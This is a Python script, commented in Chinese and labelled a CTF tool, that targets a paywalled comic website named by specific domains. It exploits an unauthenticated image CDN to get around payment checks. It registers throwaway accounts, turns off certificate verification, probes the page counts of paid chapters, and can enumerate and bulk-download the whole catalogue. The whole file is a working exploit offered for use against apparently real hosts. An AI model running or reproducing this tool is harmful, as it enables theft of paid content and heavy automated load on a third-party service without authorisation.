#!/usr/bin/env python3
"""
CTF 漫画站解锁 / 批量下载工具

目标站点: https://bz2vraf.live  (API: https://api.mikdzer.com, 图片CDN: https://b5.kammy.cn)

原理
----
1. 漫画详情 /comic/-/{id} 返回章节列表, 每章带 point(0=免费, >0=付费).
2. 前端"购买/校验"接口 PATCH /member/comic/{id}/{chapter}:
   - 免费章直接返回 {"count": N} (本章图片数量)
   - 付费章未购买时返回 code=1001 (not enough money)
3. 关键漏洞: 图片 CDN (b5.kammy.cn) 完全无鉴权.
   GET https://b5.kammy.cn/content/comic/{id}/{chapter}/{page}
   直接返回 base64 编码的 JPEG 文本, 任何未登录/未付费请求都 200.
   付费章页数可通过二分枚举 (200=存在, 500=不存在) 得到.
因此付费墙只存在于前端和 API 层, 内容本身完全公开, 可全量解锁下载.

用法
----
  python3 unlock.py --comic 52065                 # 下载一部漫画(全部章节)
  python3 unlock.py --comic 52065 --chapters 3-6  # 只下载指定章节
  python3 unlock.py --list                        # 枚举全站漫画目录(输出 CSV)
  python3 unlock.py --all --limit 5               # 批量下载: 只下 id 最大的 5 部(测试)
  python3 unlock.py --all                          # 下载全站所有漫画(id 从大到小)

断点续传
--------
  --all 模式从最大 id 开始下载, 不依赖任何进度文件.
  每部漫画是否已完整下载由 downloads/{id}/meta.json(每章页数缓存) + 文件系统
  (每章 pages/ 下所需 jpg 是否齐全) 共同判断: 完整则自动跳过, 不完整则补齐缺失.
  中断后重新运行会自动跳过已完整下载的漫画.
  已删除的漫画 id 记录在 deleted.json, 会被跳过.

输出
----
  downloads/{comicId}/{NN}_{title}/
      pages/0001.jpg ...                           原始切片 JPEG
      chapter.pdf                                  (可选, 每图一页)
  downloads/{comicId}/meta.json                    本漫画元数据: {"name": 标题, "chapters": {章号: 页数}}
"""

import argparse
import base64
import concurrent.futures as cf
import json
import os
import random
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

API_HOST = "https://api.mikdzer.com"
DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"
)
CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "creds.json")
DELETED_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deleted.json")
META_FILE = "meta.json"

PAGE_WORKERS = 10          # 页面下载并发
COUNT_WORKERS = 4          # 付费章节页数探测并发
MAX_BINARY_HI = 8192       # 二分上限

_SSL_CTX = None


def get_ssl_ctx():
    """缓存 SSL 上下文, 忽略证书校验 (站点使用自签名证书链, certifi 无法验证).

    探测场景会调用上千次, 复用上下文避免重复解析 CA.
    """
    global _SSL_CTX
    if _SSL_CTX is None:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        _SSL_CTX = ctx
    return _SSL_CTX


def load_deleted():
    """读取已删除漫画 id 集合(删除后重新下载应跳过)."""
    if not os.path.exists(DELETED_FILE):
        return set()
    try:
        with open(DELETED_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return set(str(x) for x in (data or []))
    except Exception:
        return set()


# ---------- 每本漫画的本地元数据 downloads/{id}/meta.json ----------
def comic_meta_path(out_root, comic_id):
    return os.path.join(out_root, str(comic_id), META_FILE)


def load_comic_meta(out_root, comic_id):
    """读取单部漫画的 meta.json -> {"name": 标题, "chapters": {章号: 页数}}."""
    data = {}
    p = comic_meta_path(out_root, comic_id)
    if os.path.exists(long_path(p)):
        try:
            data = json.load(open(long_path(p)))
        except Exception:
            data = {}
    chapters = data.get("chapters")
    if not isinstance(chapters, dict):
        chapters = {}
    return {"name": data.get("name", ""), "chapters": chapters}


def save_comic_meta(out_root, comic_id, name, chapters):
    """写入单部漫画的 meta.json (名称 + 每章页数)."""
    data = {"name": name, "chapters": {str(k): v for k, v in chapters.items()}}
    p = comic_meta_path(out_root, comic_id)
    os.makedirs(long_path(os.path.dirname(p)), exist_ok=True)
    json.dump(data, open(long_path(p), "w"), ensure_ascii=False, indent=1)


def log(msg):
    print(msg, flush=True)


def safe_name(name):
    """将字符串清洗为合法的 Windows 文件/目录名组件。

    - 替换 \\ / : * ? " < > |
    - 移除控制字符 (0x00-0x1F, 含换行/制表/空字节等)
    - 去除首尾空格和点 (Windows 会自动截断尾部的 . 和空格, 易引发路径不匹配)
    - 截断到 100 字符, 避免长路径问题
    """
    name = re.sub(r'[\\/:*?"<>|]', "_", name)
    name = re.sub(r'[\x00-\x1f]', "", name)
    name = name.strip(" .")
    if len(name) > 100:
        name = name[:100].rstrip(" .")
    return name if name else "unnamed"


def long_path(path):
    r"""在 Windows 上添加 \\?\ 前缀以绕过 260 字符路径长度限制。"""
    if sys.platform == "win32":
        abspath = os.path.abspath(path)
        if not abspath.startswith("\\\\?\\"):
            if abspath.startswith("\\\\"):  # UNC 路径
                return "\\\\?\\UNC" + abspath[1:]
            return "\\\\?\\" + abspath
    return path


def http_json(url, method="GET", headers=None, body=None, timeout=30, retries=6):
    """urllib 封装: 返回解析后的 JSON.

    服务器偶发 TLS 握手失败(SSLEOFError) / 连接重置, 指数退避重试并打印
    每次尝试, 避免批处理中途因单次网络故障整体崩溃.
    """
    hdrs = {"User-Agent": DEFAULT_UA}
    if headers:
        hdrs.update(headers)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        hdrs.setdefault("Content-Type", "application/json")
    ctx = get_ssl_ctx()
    last = None
    for attempt in range(retries):
        try:
            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return json.loads(resp.read().decode())
        except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError, ConnectionError, OSError) as e:
            last = e
            if attempt + 1 < retries:
                wait = 2 ** attempt + random.uniform(0, 1)
                log(f"    [!] 请求失败({type(e).__name__}: {e}), {wait:.1f}s 后重试 ({attempt + 2}/{retries})")
                time.sleep(wait)
    raise last


class Session:
    def __init__(self):
        self.token = None
        self.device_id = None
        self.merchant_id = 11009

    # ---------- 账号 ----------
    def ensure_login(self):
        if os.path.exists(CREDS_FILE):
            try:
                creds = json.load(open(CREDS_FILE))
                self.token = creds.get("token")
                self.device_id = creds.get("deviceId")
                if self.token:
                    # 校验 token 是否有效
                    try:
                        self.api("/member")
                        return
                    except Exception:
                        self.token = None
            except Exception:
                pass
        self.register_and_login()

    def register_and_login(self):
        # merchantId 从配置接口获取, 失败用默认
        try:
            cfg = http_json(f"{API_HOST}/config/merchant?domain=https://bz2vraf.live")
            self.merchant_id = cfg["data"]["merchantId"]
        except Exception:
            pass
        self.device_id = uuid.uuid4().hex[:16].upper()
        resp = http_json(
            f"{API_HOST}/member/register",
            method="POST",
            body={"deviceId": self.device_id, "source": "web", "merchantId": self.merchant_id},
        )
        hashv = resp["data"]["hash"]
        resp = http_json(
            f"{API_HOST}/member/login",
            method="POST",
            body={"hash": hashv, "deviceId": self.device_id},
        )
        self.token = resp["data"]["token"]
        json.dump({"deviceId": self.device_id, "token": self.token}, open(CREDS_FILE, "w"))
        log(f"[*] 新账号注册并登录成功 (token 已缓存到 {CREDS_FILE})")

    # ---------- API ----------
    def api(self, path, method="GET", params=None, body=None, retries=6):
        url = API_HOST + path
        if params:
            url += ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
        return http_json(
            url,
            method=method,
            headers={"Authorization": f"Bearer {self.token}"},
            body=body,
            retries=retries,
        )

    # ---------- 目录 ----------
    def catalog(self):
        """枚举全站漫画 (channel 1..6), 返回 {comic_id: title}. 并发翻页加速."""
        def fetch(channel, page):
            return self.api(
                "/comic/view",
                params={
                    "channel": channel,
                    "pageNo": page,
                    "pageSize": 100,
                    "rnd": "true",
                },
            )

        comics = {}
        with cf.ThreadPoolExecutor(max_workers=16) as ex:
            # 每 channel 先并发取第 1 页以获知 total, 再并发补齐其余页
            heads = {ex.submit(fetch, ch, 1): ch for ch in range(1, 7)}
            totals = {}
            for fut in cf.as_completed(heads):
                ch = heads[fut]
                resp = fut.result()
                totals[ch] = resp.get("total", 0)
                for r in resp.get("data", []):
                    comics.setdefault(r["id"], r.get("title", ""))
            rest = [
                ex.submit(fetch, ch, pg)
                for ch in range(1, 7)
                for pg in range(2, min((totals.get(ch, 0) + 99) // 100, 2000) + 1)
            ]
            for fut in cf.as_completed(rest):
                for r in fut.result().get("data", []):
                    comics.setdefault(r["id"], r.get("title", ""))
        log(f"[*] 目录枚举完成, 共 {len(comics)} 部漫画")
        return comics

    # ---------- 漫画/章节 ----------
    def comic_info(self, comic_id):
        resp = self.api(f"/comic/-/{comic_id}")
        d = resp["data"]
        return {
            "id": comic_id,
            "title": d.get("title", ""),
            "author": d.get("author", ""),
            "chapters": [
                {"number": c["number"], "title": c.get("title", ""), "point": c.get("point", 0)}
                for c in d.get("chapters", [])
            ],
        }

    def image_host(self):
        resp = self.api("/config/pic_url")
        return resp["data"]["imageUrl"].rstrip("/")

    def chapter_count(self, comic_id, chapter, cdn, meta, force=False):
        """返回本章页数. 免费章用 PATCH 接口; 付费章对 CDN 探测.

        meta 为本漫画 chapters 字典 {章号: 页数}.
        force=True 时忽略缓存强制刷新(用于下载前判断).
        已有旧页数时走增量探测: 页数未变一步返回, 避免全量二分拖慢跳过判断.
        """
        key = str(chapter)
        if not force and key in meta:
            return meta[key]
        old = meta.get(key)
        # 1) 已有旧页数的强制刷新: 直接走 CDN 增量探测.
        #    (PATCH 对付费章返回 400 且响应本身很慢, 没必要先试)
        if force and old:
            count = self.incr_count(cdn, comic_id, chapter, old)
            meta[key] = count
            return count
        # 2) 无旧页数: 先试官方校验接口(免费章秒回 count), 失败再全量二分
        try:
            resp = self.api(
                f"/member/comic/{comic_id}/{chapter}",
                method="PATCH",
                retries=1,
            )
            data = resp.get("data")
            if isinstance(data, dict) and data.get("count"):
                meta[key] = int(data["count"])
                return meta[key]
            if isinstance(data, int) and data > 0:
                meta[key] = data
                return meta[key]
        except Exception:
            pass
        # 3) 付费章节: 对 CDN 全量二分
        count = self.binary_search_count(cdn, comic_id, chapter)
        meta[key] = count
        return count

    def count_comic_chapters(self, comic_id, chapters, cdn, meta, force=False):
        """并发探测一部漫画全部章节页数, 写入 meta 并返回 {章号: 页数}."""
        counts = {}
        with cf.ThreadPoolExecutor(max_workers=COUNT_WORKERS) as ex:
            futs = {
                ex.submit(self.chapter_count, comic_id, c["number"], cdn, meta, force): c
                for c in chapters
            }
            for fut in cf.as_completed(futs):
                c = futs[fut]
                try:
                    counts[c["number"]] = fut.result()
                except Exception as e:
                    log(f"    [!] 第{c['number']}话页数获取失败: {e}")
        return counts

    def _page_exists(self, cdn, comic_id, chapter, page):
        """CDN 探测某页是否存在(单次请求, 不重试)."""
        ctx = get_ssl_ctx()
        url = f"{cdn}/content/comic/{comic_id}/{chapter}/{page}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
            with urllib.request.urlopen(req, timeout=25, context=ctx) as r:
                return r.status == 200
        except urllib.error.HTTPError as e:
            return e.code == 200
        except Exception:
            return False

    def _probe_all(self, cdn, comic_id, chapter, pages):
        """并行探测多个页是否存在, 返回 {page: bool}. 一轮并行 = 一次网络延迟."""
        pages = sorted(set(pages))
        with cf.ThreadPoolExecutor(max_workers=8) as ex:
            futs = {
                p: ex.submit(self._page_exists, cdn, comic_id, chapter, p)
                for p in pages
            }
        return {p: f.result() for p, f in futs.items()}

    def _binary_in(self, cdn, comic_id, chapter, lo, hi):
        """区间 (lo, hi] 内经典二分求最大存在页 (lo 存在, hi 不存在).

        CDN 单探测延迟重尾(个别 2-5s), 并行轮=取最慢; 窄区间用串行二分更稳.
        """
        while lo + 1 < hi:
            mid = (lo + hi) // 2
            if self._page_exists(cdn, comic_id, chapter, mid):
                lo = mid
            else:
                hi = mid
        return lo

    def binary_search_count(self, cdn, comic_id, chapter):
        """无旧页数的全量探测: 一轮并行探测分布种子点定位粗区间, 再串行二分细化.

        种子点根据 meta 页数分布选取 (p20=16, p75=64, p90=128, p99=256),
        常见 20-60 页章节直接落在 [16,64) 或 [64,128) 窄桶内, 串行二分 ~5-6 次即可,
        避免旧串行从 1 开始翻倍多花 4-5 次, 也不必全量并行被重尾拖慢.
        """
        # 第1轮(并行, 仅4点): 找粗区间
        seed = [16, 64, 128, 256]
        hits = self._probe_all(cdn, comic_id, chapter, seed)
        lo, hi = 1, 0
        for p in seed:
            if hits[p]:
                lo = p
            else:
                hi = min(hi or MAX_BINARY_HI, p)
                break
        if hi == 0:
            # 256 也存在: 大页数尾部, 串行往上翻倍
            lo, hi = 256, 512
            while self._page_exists(cdn, comic_id, chapter, hi):
                lo = hi
                hi *= 2
                if hi > MAX_BINARY_HI:
                    hi = MAX_BINARY_HI
                    break
        return self._binary_in(cdn, comic_id, chapter, lo, hi)

    def incr_count(self, cdn, comic_id, chapter, old):
        """基于旧页数增量刷新: 先探测 old+1, 不存在即页数未变一步返回.

        确认增长后串行往上翻倍找上界, 再二分精确定位,
        避免付费章每次跳过都全量探测 (常见情况只花 1 个 CDN 请求).
        """
        if not self._page_exists(cdn, comic_id, chapter, old + 1):
            return old  # 页数未变, 一步返回
        lo, hi = old + 1, old + 2
        while self._page_exists(cdn, comic_id, chapter, hi):
            lo = hi
            hi *= 2
            if hi > MAX_BINARY_HI:
                hi = MAX_BINARY_HI
                if self._page_exists(cdn, comic_id, chapter, hi):
                    lo = hi  # 顶到上限
                break
        return self._binary_in(cdn, comic_id, chapter, lo, hi)

    # ---------- 下载 ----------
    def download_page(self, cdn, comic_id, chapter, page, out_path):
        lp_out = long_path(out_path)
        if os.path.exists(lp_out) and os.path.getsize(lp_out) > 0:
            return True
        url = f"{cdn}/content/comic/{comic_id}/{chapter}/{page}"
        ctx = get_ssl_ctx()
        for attempt in range(4):
            try:
                log(f"        [*] {comic_id}/{chapter}/{page} 下载 (attempt {attempt+1})")
                req = urllib.request.Request(url, headers={"User-Agent": DEFAULT_UA})
                with urllib.request.urlopen(req, timeout=60, context=ctx) as r:
                    if r.status != 200:
                        raise RuntimeError(f"HTTP {r.status}")
                    text = r.read().decode(errors="ignore").strip()
                if "," in text and "base64" in text[:80]:
                    text = text.split(",", 1)[1]
                raw = base64.b64decode(text, validate=False)
                if len(raw) < 100:
                    raise RuntimeError("tiny payload")
                tmp = lp_out + ".part"
                with open(tmp, "wb") as f:
                    f.write(raw)
                os.replace(tmp, lp_out)
                return True
            except Exception as e:
                log(f"        [!] {comic_id}/{chapter}/{page}: {type(e).__name__}: {e}")
                if attempt < 3:
                    time.sleep(1.5 * (attempt + 1))
        return False

    def download_comic(self, comic_id, chapter_range=None, info=None):
        if info is None:
            info = self.comic_info(comic_id)
        cdn = self.image_host()
        log(f"[*] 漫画 {comic_id} <<{info['title']}>> 共 {len(info['chapters'])} 话")
        out_root = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
        os.makedirs(long_path(out_root), exist_ok=True)
        cm = load_comic_meta(out_root, comic_id)
        meta = cm["chapters"]

        chapters = info["chapters"]
        if chapter_range:
            lo, hi = (int(x) for x in chapter_range.split("-"))
            chapters = [c for c in chapters if lo <= c["number"] <= hi]

        # 阶段1: 获取所有章节页数 (优先复用 meta 已有缓存)
        log(f"    [*] 探测 {len(chapters)} 话页数...")
        counts = self.count_comic_chapters(comic_id, chapters, cdn, meta)
        for num, cnt in counts.items():
            log(f"    [*] 第{num}话: {cnt} 页")
        save_comic_meta(out_root, comic_id, info["title"], meta)

        # 阶段2: 并发下载所有页面 (逐章判断缺失量, 完整章节直接跳过)
        tasks = []
        for c in chapters:
            n = counts.get(c["number"])
            if not n:
                log(f"    [!] 第{c['number']}话页数未知, 跳过")
                continue
            safe_title = safe_name(c["title"] or f"第{c['number']}话")
            ch_dir = os.path.join(out_root, str(comic_id), f"{c['number']:02d}_{safe_title}")
            pages_dir = os.path.join(ch_dir, "pages")
            os.makedirs(long_path(pages_dir), exist_ok=True)
            have = 0
            for p in range(1, n + 1):
                fp = os.path.join(pages_dir, f"{p:04d}.jpg")
                if os.path.exists(long_path(fp)) and os.path.getsize(long_path(fp)) > 0:
                    have += 1
                else:
                    tasks.append((c, p, fp, ch_dir))
            if have == n:
                log(f"    [-] 第{c['number']}话 已完整 ({n} 页齐全), 跳过")
            elif have:
                log(f"    [~] 第{c['number']}话 本地 {have}/{n} 页, 需补 {n - have} 页")
            else:
                log(f"    [*] 第{c['number']}话 下载 {n} 页")

        if not tasks:
            log(f"[-] 漫画 {comic_id} 全部章节已完整, 无需下载")
            return 0, 0

        log(f"    [*] 开始下载 {len(tasks)} 页 (并发 {PAGE_WORKERS} 线程)")
        ok = fail = 0
        t0 = time.time()
        with cf.ThreadPoolExecutor(max_workers=PAGE_WORKERS) as ex:
            futs = {
                ex.submit(
                    self.download_page, cdn, comic_id, c["number"], p, out
                ): (c, p, ch_dir)
                for c, p, out, ch_dir in tasks
            }
            for fut in cf.as_completed(futs):
                c, p, ch_dir = futs[fut]
                if fut.result():
                    ok += 1
                else:
                    fail += 1
                    log(f"        [!] {comic_id}/{c['number']}/{p} 下载失败")
                done = ok + fail
                if done % 10 == 0 or done == len(tasks):
                    elapsed = time.time() - t0
                    speed = done / elapsed if elapsed > 0 else 0
                    log(f"    [*] 进度 {done}/{len(tasks)}  {ok}ok {fail}fail {elapsed:.0f}s {speed:.1f}页/s")

        # 阶段3: 每章合成 PDF
        try:
            from PIL import Image
            for c in chapters:
                n = counts.get(c["number"])
                if not n:
                    continue
                safe_title = safe_name(c["title"] or f"第{c['number']}话")
                ch_dir = os.path.join(out_root, str(comic_id), f"{c['number']:02d}_{safe_title}")
                pdf = os.path.join(ch_dir, "chapter.pdf")
                if os.path.exists(long_path(pdf)):
                    continue
                imgs = []
                for p in range(1, n + 1):
                    fp = os.path.join(ch_dir, "pages", f"{p:04d}.jpg")
                    if os.path.exists(long_path(fp)):
                        imgs.append(Image.open(long_path(fp)).convert("RGB"))
                if imgs:
                    imgs[0].save(long_path(pdf), "PDF", save_all=True, append_images=imgs[1:])
                    log(f"    [*] PDF: {pdf}")
        except Exception as e:
            log(f"    [!] PDF 生成跳过: {e}")

        elapsed = time.time() - t0
        speed = ok / elapsed if elapsed > 0 else 0
        log(f"[+] 漫画 {comic_id} 完成: {ok}/{ok+fail} 页, 耗时 {elapsed:.0f}s, {speed:.1f}页/s -> {out_root}/{comic_id}")
        return ok, fail


def is_comic_complete(out_root, comic_id, chapters, counts):
    """判断一部漫画是否已完整下载 (不依赖进度文件).

    依据本漫画 meta.json 记录的每章页数 + 文件系统实际文件:
    每章 pages/ 下 1..N 的全部 jpg 均存在且非空即视为完整.
    """
    top = os.path.join(out_root, str(comic_id))
    if not os.path.isdir(long_path(top)):
        return False
    for c in chapters:
        n = counts.get(str(c["number"]))
        if not n:
            return False  # 章节页数未知 -> 未完整
        safe_title = safe_name(c["title"] or f"第{c['number']}话")
        pages_dir = os.path.join(top, f"{c['number']:02d}_{safe_title}", "pages")
        if not os.path.isdir(long_path(pages_dir)):
            return False
        for p in range(1, n + 1):
            lp = long_path(os.path.join(pages_dir, f"{p:04d}.jpg"))
            if not (os.path.isfile(lp) and os.path.getsize(lp) > 0):
                return False
    return True


def main():
    ap = argparse.ArgumentParser(description="CTF 漫画站解锁下载工具")
    ap.add_argument("--comic", type=int, help="下载指定漫画 id")
    ap.add_argument("--chapters", help="章节范围, 如 3-6")
    ap.add_argument("--list", action="store_true", help="枚举全站漫画目录")
    ap.add_argument("--all", action="store_true", help="下载全站漫画(id 从大到小)")
    ap.add_argument("--limit", type=int, default=0, help="--all 时只下载 id 最大的前 N 部(测试用)")
    args = ap.parse_args()

    s = Session()
    s.ensure_login()
    log(f"[*] 登录成功, token 有效")

    if args.list:
        comics = s.catalog()
        csv = os.path.join(os.path.dirname(os.path.abspath(__file__)), "catalog.csv")
        with open(csv, "w") as f:
            f.write("id,title\n")
            for cid, title in sorted(comics.items()):
                f.write(f"{cid},{title}\n")
        log(f"[+] 全站漫画目录: {len(comics)} 部 -> {csv}")
        return

    if args.comic:
        if str(args.comic) in load_deleted():
            log(f"[-] 漫画 {args.comic} 已在删除记录中, 跳过下载")
            return
        s.download_comic(args.comic, args.chapters)
        return

    if args.all:
        comics = s.catalog()
        ids = sorted(comics.keys(), reverse=True)  # 从最大 id 开始, 逐步逼近 1
        if args.limit:
            ids = ids[: args.limit]

        deleted = load_deleted()
        kept = [cid for cid in ids if str(cid) not in deleted]
        if len(kept) != len(ids):
            log(f"[-] 跳过已删除的漫画 {len(ids) - len(kept)} 部")
        ids = kept

        out_root = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
        os.makedirs(long_path(out_root), exist_ok=True)
        cdn = s.image_host()

        # 依据本漫画 meta.json(每章页数) + fs(每章 jpg 是否齐全) 判断是否已完整下载.
        # 提速: 无本地目录的漫画必然不完整, 无需预判(真正下载时才取章节信息);
        # 只对已下载过的漫画做 comic_info + 页数强制刷新 + 完整性判断, 且并发执行.
        def check_local(cid):
            try:
                info = s.comic_info(cid)
            except Exception as e:
                log(f"[!] 漫画 {cid} 详情获取失败, 仍尝试下载: {e}")
                return cid, None, False
            cm = load_comic_meta(out_root, cid)
            counts = s.count_comic_chapters(cid, info["chapters"], cdn, cm["chapters"], force=True)
            # 顺便补齐单本 meta.json 的名称与页数
            save_comic_meta(out_root, cid, info["title"], cm["chapters"])
            return cid, info, is_comic_complete(out_root, cid, info["chapters"], counts)

        local_ids = [
            cid for cid in ids
            if os.path.isdir(long_path(os.path.join(out_root, str(cid))))
        ]
        todo = [(cid, None) for cid in ids if cid not in local_ids]
        skipped = 0
        local_todo = {}
        with cf.ThreadPoolExecutor(max_workers=8) as ex:
            futs = {ex.submit(check_local, cid): cid for cid in local_ids}
            for fut in cf.as_completed(futs):
                cid, info, complete = fut.result()
                if complete:
                    skipped += 1
                    log(f"    [-] {cid} <<{info['title']}>> 已完整下载, 跳过")
                else:
                    local_todo[cid] = info
        todo += [(cid, local_todo[cid]) for cid in sorted(local_todo, reverse=True)]

        log(f"[*] 目录共 {len(ids)} 部: 已完整下载跳过 {skipped}, 本次下载 {len(todo)}")

        failed = []
        for i, (cid, info) in enumerate(todo, 1):
            log(f"[*] 批量进度 {i}/{len(todo)}: 漫画 id={cid}")
            try:
                s.download_comic(cid, info=info)
            except Exception as e:
                failed.append(cid)
                log(f"[!] 漫画 {cid} 下载失败(跳过, 稍后可重跑补齐): {type(e).__name__}: {e}")
        if failed:
            log(f"[-] {len(failed)} 部下载失败: {failed}")
        log("[+] 批量下载结束")
        return

    ap.print_help()


if __name__ == "__main__":
    main()
